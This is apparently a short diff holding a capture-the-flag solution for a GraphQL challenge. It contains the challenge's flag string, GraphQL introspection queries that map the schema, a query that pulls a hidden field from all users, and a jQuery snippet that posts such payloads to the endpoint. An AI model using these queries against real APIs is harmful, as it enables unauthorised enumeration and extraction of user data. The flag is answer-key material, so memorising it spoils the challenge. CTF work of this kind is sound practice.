@@ -1,0 +1,22 @@
+ECSC{dd5cc2f6a3a566518c04161a22b82499a913442a485aeb1e76dd850305e46b1a}
+
+{"query":"{__schema{types {name}}}"}
+
+
+{"query":"{__type(name:\"UserObject\"){name\nfields{name\ntype{name\nkind}}}}"}
+
+{"query":"{__schema{queryType{fields{name\ndescription}}}}"}
+
+{"query":"{\n                allUsers{\n                    edges{\n                    node{\n                        id\n                    name\nrandomStr1ngtoInduc3P4in                    }\n                    }\n                }\n                }\n                "}
+
+
+const g = (payload) => {var request = $.ajax({
+            method: "POST",
+            dataType: "json",
+            url: "/query",
+            contentType: "application/x-www-form-urlencoded",
+            data: "query="+payload,
+            success: function(response) {
+                response.data.allUsers.edges.forEach((user) => { console.log(user.node.randomStr1ngtoInduc3P4in); });
+            }
+        })}
